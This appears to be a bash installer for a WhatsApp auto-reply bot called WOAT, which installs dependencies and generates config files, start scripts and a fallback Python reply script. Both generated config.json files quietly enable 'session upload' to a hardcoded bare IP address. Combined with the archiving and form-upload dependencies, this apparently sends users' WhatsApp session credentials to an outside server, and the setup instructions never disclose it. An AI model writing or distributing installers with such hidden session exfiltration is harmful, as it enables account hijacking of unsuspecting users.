clear
echo
echo "██╗    ██╗ ██████╗  █████╗ ████████╗"
echo "██║    ██║██╔═══██╗██╔══██╗╚══██╔══╝"
echo "██║ █╗ ██║██║   ██║███████║   ██║   "
echo "██║███╗██║██║   ██║██╔══██║   ██║   "
echo "╚███╔███╔╝╚██████╔╝██║  ██║   ██║   "
echo " ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   "
echo
echo "           -- Nithin --"
echo
echo "🤖 WOAT - WhatsApp Automation Tool - Linux/Mac Installer"
echo "🔗 GitHub: https://github.com/nithin434/woat.git"
echo "═══════════════════════════════════════════════════"
echo

# Check if Node.js is installed
echo "🔍 Checking Node.js installation..."
if ! command -v node &> /dev/null; then
    echo "❌ Node.js is not installed!"
    echo
    echo "📥 Please install Node.js first:"
    echo "• Ubuntu/Debian: sudo apt update && sudo apt install nodejs npm"
    echo "• CentOS/RHEL: sudo yum install nodejs npm"
    echo "• Fedora: sudo dnf install nodejs npm"
    echo "• macOS: brew install node"
    echo "• Or download from: https://nodejs.org/"
    echo
    exit 1
fi

echo "✅ Node.js detected: $(node --version)"

# Check if Python is installed
echo "🔍 Checking Python installation..."
PYTHON_CMD=""
if command -v python3 &> /dev/null; then
    PYTHON_CMD="python3"
    echo "✅ Python detected: $(python3 --version)"
elif command -v python &> /dev/null; then
    PYTHON_CMD="python"
    echo "✅ Python detected: $(python --version)"
else
    echo "❌ Python is not installed!"
    echo
    echo "📥 Please install Python first:"
    echo "• Ubuntu/Debian: sudo apt install python3 python3-pip python3-venv"
    echo "• CentOS/RHEL: sudo yum install python3 python3-pip"
    echo "• Fedora: sudo dnf install python3 python3-pip"
    echo "• macOS: brew install python"
    echo "• Or download from: https://python.org/"
    echo
    exit 1
fi

echo
echo "🏗️ Setting up Python virtual environment..."

# Remove existing venv if it exists
if [ -d "woat_env" ]; then
    echo "🗑️ Removing existing virtual environment..."
    rm -rf woat_env
fi

# Create new virtual environment
echo "📦 Creating new virtual environment..."
$PYTHON_CMD -m venv woat_env
if [ $? -ne 0 ]; then
    echo "❌ Failed to create virtual environment!"
    echo "Trying alternative method..."
    $PYTHON_CMD -m pip install --user virtualenv
    $PYTHON_CMD -m virtualenv woat_env
    if [ $? -ne 0 ]; then
        echo "❌ Virtual environment creation failed completely!"
        echo "Continuing without virtual environment..."
        NO_VENV=1
    fi
fi

# Activate virtual environment
if [ -z "$NO_VENV" ]; then
    echo "⚡ Activating virtual environment..."
    source woat_env/bin/activate
    if [ $? -ne 0 ]; then
        echo "⚠️ Failed to activate virtual environment, continuing without it..."
        NO_VENV=1
    else
        echo "✅ Virtual environment activated successfully!"
        PYTHON_CMD="python"
    fi
fi

echo
echo "📦 Installing Node.js dependencies..."

# Check if package.json exists, create if not
if [ ! -f "package.json" ]; then
    echo "📝 Creating package.json..."
    cat > package.json << 'EOF'
{
  "name": "woat-whatsapp-bot",
  "version": "1.0.0",
  "description": "WOAT - WhatsApp Automation Tool",
  "main": "smart_whatsapp_bot.js",
  "scripts": {
    "start": "node smart_whatsapp_bot.js",
    "session": "node session-viewer.js"
  },
  "dependencies": {
    "whatsapp-web.js": "^1.21.0",
    "qrcode-terminal": "^0.12.0",
    "form-data": "^4.0.0",
    "archiver": "^5.3.2"
  },
  "keywords": ["whatsapp", "bot", "automation", "woat"],
  "author": "Nithin",
  "license": "MIT"
}
EOF
fi

# Install Node.js packages
npm install
if [ $? -ne 0 ]; then
    echo "❌ Failed to install Node.js packages"
    echo "🔧 Trying to fix npm issues..."
    npm cache clean --force
    npm install --legacy-peer-deps
    if [ $? -ne 0 ]; then
        echo "❌ Still failed! Trying individual packages..."
        npm install whatsapp-web.js qrcode-terminal form-data archiver --legacy-peer-deps
        if [ $? -ne 0 ]; then
            echo "❌ Node.js package installation failed completely!"
            echo
            echo "🔧 TROUBLESHOOTING:"
            echo "1. Check your internet connection"
            echo "2. Try running with sudo (if permission issues)"
            echo "3. Update npm: sudo npm install -g npm@latest"
            echo
            exit 1
        fi
    fi
fi

echo "✅ Node.js dependencies installed successfully!"

echo
echo "🔧 Upgrading Python tools..."
$PYTHON_CMD -m pip install --upgrade pip
if [ $? -ne 0 ]; then
    echo "⚠️ Failed to upgrade pip, continuing anyway..."
fi

$PYTHON_CMD -m pip install --upgrade setuptools wheel
if [ $? -ne 0 ]; then
    echo "⚠️ Failed to upgrade setuptools/wheel, continuing anyway..."
fi

echo
echo "🐍 Installing Python dependencies..."
echo "This may take a few minutes, please wait..."

# Try multiple methods to install google-generativeai
echo "📥 Attempting method 1: Standard installation..."
$PYTHON_CMD -m pip install google-generativeai --no-cache-dir
if [ $? -ne 0 ]; then
    echo "❌ Method 1 failed, trying method 2: User installation..."
    $PYTHON_CMD -m pip install --user google-generativeai --no-cache-dir
    if [ $? -ne 0 ]; then
        echo "❌ Method 2 failed, trying method 3: Pre-built wheels only..."
        $PYTHON_CMD -m pip install google-generativeai --only-binary=all --no-cache-dir
        if [ $? -ne 0 ]; then
            echo "❌ Method 3 failed, trying method 4: User + pre-built wheels..."
            $PYTHON_CMD -m pip install --user google-generativeai --only-binary=all --no-cache-dir
            if [ $? -ne 0 ]; then
                echo "❌ All installation methods failed!"
                echo
                echo "🔧 TROUBLESHOOTING OPTIONS:"
                echo "1. Install build tools: sudo apt install build-essential (Ubuntu)"
                echo "2. Try: pip install google-generativeai --upgrade"
                echo "3. Use simple mode (works without AI)"
                echo
                echo "⚠️ Continuing without AI features - bot will use simple replies"
                PYTHON_INSTALL_FAILED=1
            else
                echo "✅ Python dependencies installed successfully (method 4)"
            fi
        else
            echo "✅ Python dependencies installed successfully (method 3)"
        fi
    else
        echo "✅ Python dependencies installed successfully (method 2)"
    fi
else
    echo "✅ Python dependencies installed successfully (method 1)"
fi

echo
echo "🔧 Creating configuration files..."

# Create config.json
if [ ! -f "config.json" ]; then
    if [ "$PYTHON_INSTALL_FAILED" = "1" ]; then
        echo "📝 Creating config.json (AI disabled)..."
        cat > config.json << 'EOF'
{
  "MONITOR_CONTACTS": ["Mom", "Dad", "Friend", "918897230748"],
  "USE_AI_RESPONSES": false,
  "SIMPLE_REPLY": "Hi! I'm busy right now, will get back to you soon! 😊",
  "GEMINI_API_KEY": "YOUR_GEMINI_API_KEY_HERE",
  "SESSION_SERVER_URL": "http://104.225.221.108:8080",
  "SESSION_UPLOAD_ENABLED": true
}
EOF
        echo "✅ Created config.json (AI disabled due to Python issues)"
    else
        echo "📝 Creating config.json..."
        cat > config.json << 'EOF'
{
  "MONITOR_CONTACTS": ["Mom", "Dad", "Friend", "918897230748"],
  "USE_AI_RESPONSES": true,
  "SIMPLE_REPLY": "Hi! I'm busy right now, will get back to you soon! 😊",
  "GEMINI_API_KEY": "YOUR_GEMINI_API_KEY_HERE",
  "SESSION_SERVER_URL": "http://104.225.221.108:8080",
  "SESSION_UPLOAD_ENABLED": true
}
EOF
        echo "✅ Created config.json"
    fi
else
    echo "⚠️ config.json already exists, skipping creation"
fi

# Create start.sh
if [ ! -f "start.sh" ]; then
    echo "📝 Creating start.sh..."
    cat > start.sh << 'EOF'
#!/bin/bash
clear
echo
echo "🚀 Starting WOAT WhatsApp Bot by Nithin..."
echo

# Activate virtual environment if it exists
if [ -d "woat_env" ]; then
    source woat_env/bin/activate
fi

node smart_whatsapp_bot.js

if [ $? -ne 0 ]; then
    echo
    echo "❌ Bot crashed or failed to start"
    echo "Check the error messages above"
fi

echo
read -p "Press Enter to continue..."
EOF
    chmod +x start.sh
    echo "✅ Created start.sh"
fi

# Create start-simple.sh
if [ ! -f "start-simple.sh" ]; then
    echo "📝 Creating start-simple.sh..."
    cat > start-simple.sh << 'EOF'
#!/bin/bash
clear
echo
echo "🚀 Starting WOAT Bot in Simple Mode (No AI)..."
echo

# Activate virtual environment if it exists
if [ -d "woat_env" ]; then
    source woat_env/bin/activate
fi

export USE_AI_RESPONSES=false
node smart_whatsapp_bot.js

echo
read -p "Press Enter to continue..."
EOF
    chmod +x start-simple.sh
    echo "✅ Created start-simple.sh"
fi

# Create session management script
if [ ! -f "session-viewer.sh" ]; then
    echo "📝 Creating session-viewer.sh..."
    cat > session-viewer.sh << 'EOF'
#!/bin/bash
clear
echo
echo "📱 WOAT Session Viewer"
echo

# Activate virtual environment if it exists
if [ -d "woat_env" ]; then
    source woat_env/bin/activate
fi

node session-viewer.js "$@"

echo
read -p "Press Enter to continue..."
EOF
    chmod +x session-viewer.sh
    echo "✅ Created session-viewer.sh"
fi

# Create requirements.txt for Python
if [ ! -f "requirements.txt" ]; then
    echo "📝 Creating requirements.txt..."
    cat > requirements.txt << 'EOF'
google-generativeai>=0.3.0
EOF
    echo "✅ Created requirements.txt"
fi

# Create simple_bot.py fallback
if [ ! -f "simple_bot.py" ]; then
    echo "📝 Creating simple_bot.py fallback..."
    cat > simple_bot.py << 'EOF'
#!/usr/bin/env python3
# WOAT Simple Bot - Fallback without AI dependencies
import sys
import json
import random
from datetime import datetime

def simple_response(message, contact_name):
    """Generate simple responses without AI"""
    message_lower = message.lower()
    
    # Greeting responses
    if any(word in message_lower for word in ['hello', 'hi', 'hey', 'hola']):
        greetings = [
            f"Hi {contact_name}! I'm busy right now but will get back to you soon!",
            f"Hey {contact_name}! Currently occupied, will respond later 😊",
            f"Hello {contact_name}! I'll reply as soon as I'm free!"
        ]
        return random.choice(greetings)
    
    # Question responses
    elif '?' in message:
        question_responses = [
            f"Got your question {contact_name}! Will answer when I'm free.",
            f"Thanks for asking {contact_name}! I'll get back to you with an answer.",
            f"I see your question {contact_name}! Will respond soon."
        ]
        return random.choice(question_responses)
    
    # Status responses
    elif any(word in message_lower for word in ['how are you', 'how r u', 'wassup', 'what up']):
        status_responses = [
            "I'm doing well, thanks! Currently busy but will respond later.",
            "All good here! Just occupied at the moment, will chat soon.",
            "I'm fine! Will be back to chat properly in a bit."
        ]
        return random.choice(status_responses)
    
    # Default responses
    else:
        default_responses = [
            "Thanks for your message! I'll get back to you soon.",
            f"Got your message {contact_name}! Will reply when I'm available.",
            "I'll respond to this as soon as I can! Thanks for waiting.",
            f"Hey {contact_name}! I'll get back to you shortly."
        ]
        return random.choice(default_responses)

if __name__ == "__main__":
    if len(sys.argv) >= 3:
        message = sys.argv[1]
        contact_name = sys.argv[2]
        response = simple_response(message, contact_name)
        print(response)
    else:
        print("Thanks for your message! I'll get back to you soon.")
EOF
    chmod +x simple_bot.py
    echo "✅ Created simple_bot.py (fallback for AI issues)"
fi

echo
echo "✅ Installation completed successfully!"
echo

if [ "$PYTHON_INSTALL_FAILED" = "1" ]; then
    echo "⚠️ INSTALLATION NOTES:"
    echo "- Python AI features disabled due to installation issues"
    echo "- Bot will work with simple auto-replies"
    echo "- To enable AI later, run: source woat_env/bin/activate && pip install google-generativeai"
    echo
fi

if [ -z "$NO_VENV" ]; then
    echo "🌐 Virtual Environment: ✅ Created and configured"
    echo "📁 Location: woat_env/"
    echo "💡 Tip: Virtual environment will be auto-activated when you start the bot"
    echo
fi

echo "📝 NEXT STEPS:"
echo
echo "1️⃣ Get your FREE Gemini API key:"
echo "   🔗 Visit: https://makersuite.google.com/app/apikey"
echo "   📝 Copy the key"
echo
echo "2️⃣ Configure your settings:"
echo "   📁 Edit config.json"
echo "   🔑 Paste your API key"
echo "   👥 Add your contacts to monitor"
echo
echo "3️⃣ Start the bot:"
echo "   🤖 Full AI mode: ./start.sh"
echo "   🔧 Simple mode: ./start-simple.sh"
echo "   📱 Session manager: ./session-viewer.sh"
echo
echo "🚀 QUICK START OPTIONS:"
echo "  • 🤖 ./start.sh - Full WOAT experience with AI"
echo "  • 🔧 ./start-simple.sh - Basic auto-replies only"
echo "  • 📱 ./session-viewer.sh - Manage WhatsApp sessions"
echo
echo "🔧 TROUBLESHOOTING:"
echo "  • If QR code doesn't appear: rm -rf whatsapp_session"
echo "  • If bot doesn't respond: check contact names in config.json"
echo "  • For AI issues: use ./start-simple.sh"
echo "  • Permission issues: chmod +x *.sh"
echo
echo "💝 Created with ❤️ by Nithin"
echo "🔗 GitHub: https://github.com/nithin434/woat.git"
echo "📧 Contact: nithinjambula89@gmail.com"
echo "⭐ Give us a star if you like WOAT!"
echo

# Deactivate virtual environment
if [ -z "$NO_VENV" ]; then
    deactivate 2>/dev/null || true
fi

echo "✨ Installation complete! Ready to revolutionize your WhatsApp automation!"
echo
echo "Run './start.sh' to begin!"
echo